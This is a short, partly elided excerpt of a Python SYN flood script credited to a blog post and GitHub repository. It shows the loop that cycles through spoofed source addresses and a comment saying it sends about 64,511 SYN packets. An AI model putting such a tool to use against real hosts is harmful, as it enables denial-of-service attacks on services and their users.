...
#Credit: https://dubell.io/creating-syn-flood-attacks-with-python/
#usage instructions: https://github.com/mjdubell/SYN-Flooder
#need to run with "python3" command on terminal
...
def main(arguments):
    ...
    print("###########################################\n")
    #range specifes number of spoofed IP Addresses. Original upperbound was 254, lowered to 50.
    for src_host in range(1,50):
        if verbose or very_verbose:
            print(f"[*] Sending spoofed SYN packets from {src_net}{src_host}")
            print("--------------------------------------------")

        #range causes 64,511 SYN packets
